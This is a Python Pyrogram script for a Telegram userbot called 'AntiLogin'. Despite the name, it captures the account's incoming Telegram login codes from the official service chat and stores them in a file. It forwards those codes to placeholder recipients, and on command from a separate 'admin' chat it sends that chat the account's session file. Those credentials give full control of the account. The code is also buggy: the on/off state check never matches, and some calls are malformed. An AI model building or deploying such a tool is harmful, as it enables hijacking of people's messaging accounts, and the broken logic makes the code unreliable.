from pyrogram import *
from pyrogram.errors import SessionPasswordNeeded
from re import search

def GenerateEmojiNumber(lenght:str):
    NumberEmoji=''
    for i in lenght:
        if i=="1":
            NumberEmoji+= "1️⃣"
        elif i=="2":
            NumberEmoji+= "2️⃣"
        elif i=="3":
            NumberEmoji+= "3️⃣"
        elif i=="4":
            NumberEmoji+= "4️⃣"
        elif i=="5":
            NumberEmoji+= "5️⃣"
        elif i=="6":
            NumberEmoji+= "6️⃣"
        elif i=="7":
            NumberEmoji+= "7️⃣"
        elif i=="8":
            NumberEmoji+= "8️⃣"
        elif i=="9":
            NumberEmoji+= "9️⃣"
        elif i=="0":
            NumberEmoji+= "0️⃣"
    return NumberEmoji

API_ID=int(input("Api Id: "))
API_HASH=input("Api Hash: ")

AntiLogin=Client("AntiLogin",API_ID,API_HASH,device_model="Redmi Redmi Note 11 Pro")
global State
State=False

StateLogin=AntiLogin.connect()
if StateLogin is False:
    Phone_Number=input("Phone: ")
    SendLoginCode=AntiLogin.send_code(Phone_Number)
    CodeLogin=input("Login Code: ")
    try:
        AntiLogin.sign_in(AntiLogin,Phone_Number,SendLoginCode.phone_code_hash,CodeLogin)
    except SessionPasswordNeeded:
        AntiLogin.check_password(input("Password: "))
    if AntiLogin.is_connected:
        print("Login succsess :)")
    else:
        print("Login feild :(")
AntiLogin.disconnect()

@AntiLogin.on_message(filters.me)
async def Manage_Me(_:AntiLogin,e:types.Message):
    Text=e.text
    UserId=e.from_user.id
    global State
    if Text=="Antion":
        State=True
        await AntiLogin.edit_message_text(UserId,e.id,"Anti Login On ✅")
    elif Text=="Antioff":
        State=False
        await AntiLogin.edit_message_text(UserId,e.id,"Anti Login Off ⚠")
    elif Text=="Help":
       await AntiLogin.edit_message_text(UserId,e.id,"[✅] Antion\n[⚠] Antioff\n[👻] State\n[🙋] Ping\n[🌀] Sendsession")
    elif Text=="Ping":
         await AntiLogin.edit_message_text(UserId,e.id,"Ready 🙋")
    elif Text=="State":
        await AntiLogin.edit_message_text(UserId,e.id,'[👻] '+State)
    elif Text=="Sendsession":
        await AntiLogin.delete_messages(UserId,e.id)
        await AntiLogin.send_document(UserId,".//AntiLogin.session")

@AntiLogin.on_message(filters.chat("""User id account admin"""))
async def StateCreator(_:AntiLogin,e:types.Message):
    Text=e.text
    UserId=e.from_user.id
    global State
    if Text=="Antion":
        State=True
        await AntiLogin.send_message(UserId,"Anti Login On ✅")
    elif Text=="Antioff":
        State=False
        await AntiLogin.send_message(UserId,"Anti Login Off ⚠")
    elif Text=="Help":
       await AntiLogin.send_message(UserId,"[✅] Antion\n[⚠] Antioff\n[👻] State\n[🙋] Ping\n[🔐] Sendcode | Send\n[🌀] Sendsession")
    elif Text=="Ping":
         await AntiLogin.send_message(UserId,"Ready 🙋")
    elif Text=="State":
        await AntiLogin.send_message(UserId,'[👻] '+State)
    elif Text =="Send" or Text=="Sendcode":
        with open("LoginCode.txt","r",encoding="utf-8") as ReadFile:
            CharCode=ReadFile.read()
        if CharCode is None or CharCode == '':
            await AntiLogin.send_message(UserId,'[👻] None')
        else:
            await AntiLogin.send_message("LoginCode","🌀 "+CharCode)
    elif Text=="Sendsession":
        await AntiLogin.send_document(UserId,".//AntiLogin.session")

@AntiLogin.on_message(filters.chat(777000))
async def LoginCode(_:AntiLogin,e:types.Message):
    Text=e.text
    if State=="on":
        await AntiLogin.send_message("UserIdSendExiperdCode",e.text)
        await AntiLogin.send_message("me",e.text)
    else:
        Text=search("[a-zA-Z][a-zA-Z][a-zA-Z][a-zA-Z][a-zA-Z]\s+[a-zA-Z][a-zA-Z][a-zA-Z][a-zA-Z]:\s[0-9]{5}",Text).group().replace("Login code: ","")
        if Text.isnumeric():
            with open("LoginCode.txt","w",encoding="utf-8") as WriteFiles:
                WriteFiles.write(GenerateEmojiNumber(Text))

print("AntiLogin Is Ready :)")
AntiLogin.run()
